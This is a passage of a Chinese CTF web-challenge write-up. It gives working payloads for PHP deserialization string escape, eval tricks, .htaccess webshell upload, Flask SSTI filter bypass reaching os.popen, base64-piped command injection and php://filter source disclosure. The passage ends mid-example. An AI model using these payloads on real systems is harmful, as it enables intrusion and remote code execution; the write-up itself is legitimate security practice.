class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lemon</span>(<span class="hljs-params">$string</span>)</span>&#123;<br>$lemon = <span class="hljs-string">&#x27;/p/i&#x27;</span>;<br><span class="hljs-keyword">return</span> preg_replace($lemon,<span class="hljs-string">&#x27;ww&#x27;</span>,$string);<br>&#125;<br>$username = $_GET[<span class="hljs-string">&#x27;a&#x27;</span>];<br>$age = <span class="hljs-string">&#x27;20&#x27;</span>;<br>$user = <span class="hljs-keyword">array</span>($username,$age);<br>var_dump(serialize($user));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>$r = lemon(serialize($user));<br>var_dump($r);<br>var_dump(unserialize($r));<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#### 第一种情况</span><br>?a=apple时<br>    <br><span class="hljs-keyword">string</span>(<span class="hljs-number">35</span>) <span class="hljs-string">&quot;a:2:&#123;i:0;s:5:&quot;</span>apple<span class="hljs-string">&quot;;i:1;s:2:&quot;</span><span class="hljs-number">20</span><span class="hljs-string">&quot;;&#125;&quot;</span><br>&lt;br&gt;<br><span class="hljs-keyword">string</span>(<span class="hljs-number">37</span>) <span class="hljs-string">&quot;a:2:&#123;i:0;s:5:&quot;</span>awwwwle<span class="hljs-string">&quot;;i:1;s:2:&quot;</span><span class="hljs-number">20</span><span class="hljs-string">&quot;;&#125;&quot;</span><br><span class="hljs-keyword">bool</span>(<span class="hljs-literal">false</span>) <span class="hljs-comment">### 报错 不能反序列化</span><br><span class="hljs-comment">#### 第二种情况</span><br>   <span class="hljs-string">&quot;;i:1;s:2:&quot;</span><span class="hljs-number">20</span><span class="hljs-string">&quot;;&#125;  16个字符 </span><br><span class="hljs-string">?a=pppppppppppppppp&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;20&quot;</span>;&#125;时<br>    <br><span class="hljs-keyword">string</span>(<span class="hljs-number">63</span>) <span class="hljs-string">&quot;a:2:&#123;i:0;s:32:&quot;</span>pppppppppppppppp<span class="hljs-string">&quot;;i:1;s:2:&quot;</span><span class="hljs-number">20</span><span class="hljs-string">&quot;;&#125;&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;20&quot;</span>;&#125;<span class="hljs-string">&quot;</span><br><span class="hljs-string">&lt;br&gt;string(79) &quot;</span>a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">32</span>:<span class="hljs-string">&quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;20&quot;</span>;&#125;<span class="hljs-string">&quot;;i:1;s:2:&quot;</span><span class="hljs-number">20</span><span class="hljs-string">&quot;;&#125;&quot;</span><br><span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">32</span>) <span class="hljs-string">&quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;20&quot;</span><br>&#125; <span class="hljs-comment">### 成功反序列化</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 过滤后字符串减少时</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str_rep</span>(<span class="hljs-params">$string</span>)</span>&#123;<br><span class="hljs-keyword">return</span> preg_replace( <span class="hljs-string">&#x27;/lemon|shy/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>, $string);<br>&#125;<br><br>$test[<span class="hljs-string">&#x27;name&#x27;</span>] = $_GET[<span class="hljs-string">&#x27;name&#x27;</span>];<br>$test[<span class="hljs-string">&#x27;sign&#x27;</span>] = $_GET[<span class="hljs-string">&#x27;sign&#x27;</span>]; <br>$test[<span class="hljs-string">&#x27;number&#x27;</span>] = <span class="hljs-string">&#x27;2020&#x27;</span>;<br>$tt=serialize($test);<br><span class="hljs-keyword">echo</span>($tt);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>$temp = str_rep($tt);<br><span class="hljs-keyword">echo</span>($temp);<br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>$fake = unserialize($temp);<br>var_dump(($fake));<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-comment"># 第一种情况</span><br>    name=lemon&amp;sign=gogogo<br>    a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;lemon&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;sign&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;gogogo&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;number&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;2020&quot;</span>;&#125;<br>a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;sign&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;gogogo&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;number&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;2020&quot;</span>;&#125;<br><span class="hljs-keyword">bool</span>(<span class="hljs-literal">false</span>) <span class="hljs-comment">#lemon被替换 无法反序列化</span><br>    <span class="hljs-comment">#第二种情况</span><br>     name=pika&amp;sign=<span class="hljs-string">&quot;;s:6:&quot;</span>number<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-number">2020</span><span class="hljs-string">&quot;;&#125;   </span><br><span class="hljs-string">    a:3 &#123;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:4:&quot;</span>pika<span class="hljs-string">&quot;;s:4:&quot;</span>sign<span class="hljs-string">&quot;;s:27:&quot;</span><span class="hljs-string">&quot;;s:6:&quot;</span>number<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-number">2020</span><span class="hljs-string">&quot;;&#125;&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;number&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;2020&quot;</span>;&#125;<br>a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pika&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;sign&quot;</span>;s:<span class="hljs-number">27</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;number&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;2020&quot;</span>;&#125;<span class="hljs-string">&quot;;s:6:&quot;</span>number<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-number">2020</span><span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">array(3) &#123; [&quot;</span>name<span class="hljs-string">&quot;]=&gt; string(4) &quot;</span>pika<span class="hljs-string">&quot; [&quot;</span>sign<span class="hljs-string">&quot;]=&gt; string(27) &quot;</span><span class="hljs-string">&quot;;s:6:&quot;</span>number<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-number">2020</span><span class="hljs-string">&quot;;&#125;&quot;</span> [<span class="hljs-string">&quot;number&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;2020&quot;</span> &#125;<br><span class="hljs-comment">#第三种情况</span><br>    name=shyshyshyshyshyshyshyshyshy&amp;sign=hello123<span class="hljs-string">&quot;;s:4:&quot;</span>sign<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-keyword">eval</span><span class="hljs-string">&quot;;s:6:&quot;</span>number<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-number">2000</span><span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">a:3:&#123;s:4:&quot;</span>name<span class="hljs-string">&quot;;s:27:&quot;</span>shyshyshyshyshyshyshyshyshy<span class="hljs-string">&quot;;s:4:&quot;</span>sign<span class="hljs-string">&quot;;s:57:&quot;</span>hello123<span class="hljs-string">&quot;;s:4:&quot;</span>sign<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-keyword">eval</span><span class="hljs-string">&quot;;s:6:&quot;</span>number<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-number">2000</span><span class="hljs-string">&quot;;&#125;&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;number&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;2020&quot;</span>;&#125;<br><br>a:<span class="hljs-number">3</span>:a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">27</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;sign&quot;</span>;s:<span class="hljs-number">57</span>:<span class="hljs-string">&quot;hello123&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;sign&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;eval&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;number&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;2000&quot;</span>;&#125;<span class="hljs-string">&quot;;s:6:&quot;</span>number<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-number">2020</span><span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(3) &#123; [&quot;</span>name<span class="hljs-string">&quot;]=&gt; string(27) &quot;</span><span class="hljs-string">&quot;;s:4:&quot;</span>sign<span class="hljs-string">&quot;;s:57:&quot;</span>hello123<span class="hljs-string">&quot; [&quot;</span>sign<span class="hljs-string">&quot;]=&gt; string(4) &quot;</span><span class="hljs-keyword">eval</span><span class="hljs-string">&quot; [&quot;</span>number<span class="hljs-string">&quot;]=&gt; string(4) &quot;</span><span class="hljs-number">2000</span><span class="hljs-string">&quot; &#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">payload</span>：<span class="hljs-selector-tag">changechangechangechangechangechangechange</span>&quot;;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:&quot;password&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;easy&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/nT2bhM7QjVOFN8s.png" alt="image-20201108222105587"></p><h3 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">// flag在flag.php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\(.*\)/&#x27;</span>, $_GET[<span class="hljs-string">&#x27;a&#x27;</span>]))<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>        ob_start(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">$data</span>)</span>&#123;<br>                 <span class="hljs-keyword">if</span> (strpos($data, <span class="hljs-string">&#x27;flag&#x27;</span>) !== <span class="hljs-literal">false</span>)<br>                 <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ByeBye hacker&#x27;</span>;<br>                 <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                 &#125;);<br>        <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">payload:</span> <span class="hljs-string">?a</span>=echo <span class="hljs-string">`cat flag.php|base64`</span>;   <span class="hljs-comment"># 注意最后需要引号，这样是完整的php代码</span><br></code></pre></td></tr></table></figure><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>show_source(<span class="hljs-keyword">__FILE__</span>);<br>$username  = <span class="hljs-string">&quot;admin&quot;</span>;<br>$password  = <span class="hljs-string">&quot;password&quot;</span>;<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>$data = <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;data&#x27;</span>])? $_POST[<span class="hljs-string">&#x27;data&#x27;</span>]: <span class="hljs-string">&quot;&quot;</span> ;<br>$data_unserialize = unserialize($data);<br><span class="hljs-keyword">if</span> ($data_unserialize[<span class="hljs-string">&#x27;username&#x27;</span>]==$username&amp;&amp;$data_unserialize[<span class="hljs-string">&#x27;password&#x27;</span>]==$password)&#123;<br>    <span class="hljs-keyword">echo</span> $flag;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>php反序列化  弱等于</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">payload</span>: <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;<span class="hljs-attribute">b</span>:<span class="hljs-number">1</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;<span class="hljs-attribute">b</span>:<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure><blockquote><p>flag.php里面将username与password修改了因此不能直接序列化</p><p>看代码感觉能直接序列化，但是结果就是不行，才尝试这个方法</p></blockquote><h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h3><p><img src="https://i.loli.net/2020/11/12/1tG2VufTJ8mR5kO.png" alt="image-20201112215551987"></p><p>本题禁止文件中出现某些字符，并且禁止了某些文件名</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">使用 <span class="hljs-selector-class">.htaccess</span> 攻击 经过测试发现<span class="hljs-selector-class">.htaccess</span>可以上传<br>*** <span class="hljs-selector-class">.htaccess</span> 文件内容可以换行输入 <br>*** 一句话木马也可以简化<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/EAm4nINolJzpdMb.png" alt="image-20201112215939469"></p><p><img src="https://i.loli.net/2020/11/12/4oRyYeV2SNUfjXs.png" alt="image-20201112220014395"></p><h3 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h3><h4 id="预备知识SSTI"><a href="#预备知识SSTI" class="headerlink" title="预备知识SSTI"></a>预备知识SSTI</h4><blockquote><p>开始时由于没有学ssti导致一头雾水，网上乱扒payload，结果显然失败（还是自己认真学一下吧）</p></blockquote><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><ol><li>SSTI的解题步骤：找基本类—&gt;找子类—&gt;找可利用的子类模板</li></ol><p>本题过滤了[]  ‘ ‘ “” __</p><blockquote><p>使用   |attr(request.args.value) 绕过</p></blockquote><p>首先查看基本类</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">原来的语句：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.base__</span>&#125;&#125;</span><br><span class="xml">绕过语句：</span><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">request.args.class</span>)|attr(<span class="hljs-name">request.args.base</span>)&#125;&#125;</span><span class="xml">&amp;class=__class__&amp;base=__base__</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/10/ZfNh8rXKsmwItW6.png" alt="image-20201110223125694"></p><p>找子类</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">原句：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.base__.__subclasses__</span>()&#125;&#125;</span><br><span class="xml">绕过：</span><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">request.args.class</span>)|attr(<span class="hljs-name">request.args.base</span>)|attr(<span class="hljs-name">request.args.sub</span>)()&#125;&#125;</span><span class="xml">&amp;class=__class__&amp;base=__base__&amp;sub=__subclasses__</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/10/GmDwX2RiZTyqI9u.png" alt="image-20201110225005807"></p><p>选择某一个子类</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">原句：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[199]&#125;&#125;</span><span class="xml">输出第199个</span><br><span class="xml">绕过: </span><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">request.args.class</span>)|attr(<span class="hljs-name">request.args.base</span>)|attr(<span class="hljs-name">request.args.sub</span>)()|attr(<span class="hljs-name">request.args.getitem</span>)(<span class="hljs-name">199</span>)&#125;&#125;</span><span class="xml">&amp;&amp;class=__class__&amp;base=__base__&amp;sub=__subclasses__&amp;getitem=__getitem__</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/10/vqSNMkbALn6DQs2.png" alt="image-20201110231227463"></p><p>读取flag</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">原句:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">warnings.catch_warnings.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]</span>(<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat%20/flag.txt&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="xml">绕过：</span><span class="hljs-template-variable">&#123;&#123;(()|<span class="hljs-name">attr</span>(<span class="hljs-name">request.args.class</span>)|attr(<span class="hljs-name">request.args.base</span>)|attr(<span class="hljs-name">request.args.sub</span>)()|attr(<span class="hljs-name">request.args.getitem</span>)(<span class="hljs-name">166</span>))|attr(<span class="hljs-name">request.args.init</span>)|attr(<span class="hljs-name">request.args.globals</span>)|attr(<span class="hljs-name">request.args.getitem</span>)(<span class="hljs-name">request.args.builtins</span>)|attr(<span class="hljs-name">request.args.getitem</span>)(<span class="hljs-name">request.args.eval</span>)(<span class="hljs-name">request.args.param</span>)&#125;&#125;</span><span class="xml">&amp;class=__class__&amp;base=__base__&amp;sub=__subclasses__&amp;getitem=__getitem__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;eval=eval&amp;param=__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/10/nSrJy95afpuUv4Q.png" alt="image-20201110235346373"></p><blockquote><p>注意细心 千万不要把字母拼错</p></blockquote><h3 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h3><blockquote><p>命令执行 绕过</p></blockquote><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">?url=<span class="hljs-number">127</span>|sort%<span class="hljs-number">09</span>index.php<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/12/bNUpZqs6fIvegHd.png" alt="image-20201112220350802"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">查看flag的位置：?url=<span class="hljs-number">127</span>|ls<span class="hljs-symbol">%09</span>../../../../<br>获取flag：??url=<span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>|echo<span class="hljs-symbol">%09</span><span class="hljs-keyword">c</span><span class="hljs-number">29</span>ydCAuL<span class="hljs-keyword">i8</span>uL<span class="hljs-keyword">i8</span>uL<span class="hljs-keyword">i8</span>uL<span class="hljs-keyword">i9</span>mbGFn|base<span class="hljs-number">64</span><span class="hljs-symbol">%09</span>-d|sh<br># 使用base<span class="hljs-number">64</span>绕过过滤<br></code></pre></td></tr></table></figure><h3 id="ezfind"><a href="#ezfind" class="headerlink" title="ezfind"></a>ezfind</h3><p><img src="https://i.loli.net/2020/11/14/DsAPdxUfl1pKGHo.png" alt="image-20201114173433689"></p><blockquote><p>此题很玄学  非预期</p></blockquote><h3 id="L0vephp"><a href="#L0vephp" class="headerlink" title="L0vephp"></a>L0vephp</h3><blockquote><p>此题需要找到正确的入口(?action=)</p></blockquote><p>查看源代码</p><p><img src="https://i.loli.net/2020/11/17/HikUYbcWPlmLo3Q.png" alt="image-20201117235651530"></p><p>发现了最后一段为base85编码</p><p><img src="https://i.loli.net/2020/11/17/PhO2oEnmVtM7dQX.png" alt="image-20201117235634186"></p><blockquote><p>此题过滤了base64 所以这里采用  php://filter/convert.quoted-printable-encode/resource=flag.php</p></blockquote><p>获取到了flag.php 再解码</p><p><img src="https://i.loli.net/2020/11/15/KwgAlnCI4TSjhXt.png" alt="image-20201115130752260"></p><p>发现flag是假的，并且看见了提示，使用hex解码</p><p><img src="https://i.loli.net/2020/11/15/Fa3MrlTECSRHvk6.png" alt="image-20201115130847252"></p><p>访问获得源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>error_reporting(<span class="hljs-number">0</span>);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br>$code=$_REQUEST[<span class="hljs-string">&#x27;code&#x27;</span>];<br><br>$_=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;@&#x27;</span>,<span class="hljs-string">&#x27;\~&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;\&amp;&#x27;</span>,<span class="hljs-string">&#x27;\?&#x27;</span>,<span class="hljs-string">&#x27;\&lt;&#x27;</span>,<span class="hljs-string">&#x27;\&gt;&#x27;</span>,<span class="hljs-string">&#x27;\*&#x27;</span>,<span class="hljs-string">&#x27;\`&#x27;</span>,<span class="hljs-string">&#x27;\+&#x27;</span>,<span class="hljs-string">&#x27;\-&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;\\\\&#x27;</span>,<span class="hljs-string">&#x27;\/&#x27;</span>); <br>$__=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;shell_exec&#x27;</span>,<span class="hljs-string">&#x27;assert&#x27;</span>,<span class="hljs-string">&#x27;passthru&#x27;</span>,<span class="hljs-string">&#x27;array_map&#x27;</span>,<span class="hljs-string">&#x27;ob_start&#x27;</span>,<span class="hljs-string">&#x27;create_function&#x27;</span>,<span class="hljs-string">&#x27;call_user_func&#x27;</span>,<span class="hljs-string">&#x27;call_user_func_array&#x27;</span>,<span class="hljs-string">&#x27;array_filter&#x27;</span>,<span class="hljs-string">&#x27;proc_open&#x27;</span>);<br>$blacklist1 = array_merge($_);<br>$blacklist2 = array_merge($__);<br><br><span class="hljs-keyword">if</span> (strlen($code)&gt;<span class="hljs-number">16</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Too long&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">foreach</span> ($blacklist1 <span class="hljs-keyword">as</span> $blacklisted) &#123; <br>    <span class="hljs-keyword">if</span> (preg_match (<span class="hljs-string">&#x27;/&#x27;</span> . $blacklisted . <span class="hljs-string">&#x27;/m&#x27;</span>, $code)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;WTF???&#x27;</span>); <br>    &#125; <br>&#125; <br><br><span class="hljs-keyword">foreach</span> ($blacklist2 <span class="hljs-keyword">as</span> $blackitem) &#123;<br>    <span class="hljs-keyword">if</span> (preg_match (<span class="hljs-string">&#x27;/&#x27;</span> . $blackitem . <span class="hljs-string">&#x27;/im&#x27;</span>, $code)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Sry,try again&#x27;</span>);<br>    &#125;<br>&#125;<br>@<span class="hljs-keyword">eval</span>($code);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>目前做到这里就不会了 ， 先空着等之后去学习一下大佬的wp</p><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">eval长度限制绕过</a></p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">利用变长参数特性展开数组<br>变长参数是PHP5.<span class="hljs-number">6</span>新引入的新特性，php中可以使用<span class="hljs-keyword">func</span>(...<span class="hljs-variable">$arr</span>)这样的方式将<span class="hljs-variable">$arr</span>数组展开成多个参数传入<span class="hljs-keyword">func</span>函数<br></code></pre></td></tr></table></figure><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs smali">传入样例：<br>POST 